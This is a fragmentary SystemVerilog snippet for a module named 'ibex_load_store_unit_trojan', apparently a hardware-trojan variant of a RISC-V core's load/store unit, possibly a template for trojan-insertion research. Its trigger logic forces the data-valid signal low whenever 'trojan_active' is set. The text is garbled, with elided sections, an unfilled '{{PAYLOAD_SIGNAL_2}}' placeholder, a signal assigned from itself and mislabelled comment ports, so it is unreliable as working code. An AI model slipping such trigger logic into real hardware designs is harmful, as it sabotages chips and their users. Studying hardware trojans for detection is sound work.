...
module ibex_load_store_unit_trojan (
    ...
    assign data_rvalid_i = trojan_active ? 1'b0 : data_rvalid_i_normal;
    ...
    logic data_rvalid_i_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign data_rvalid_i_normal = data_rvalid_i;
 ...
 *     input  logic instr_valid_i,   // data_rvalid_i
 *     output logic instr_valid_o    // data_rvalid_i
 * );
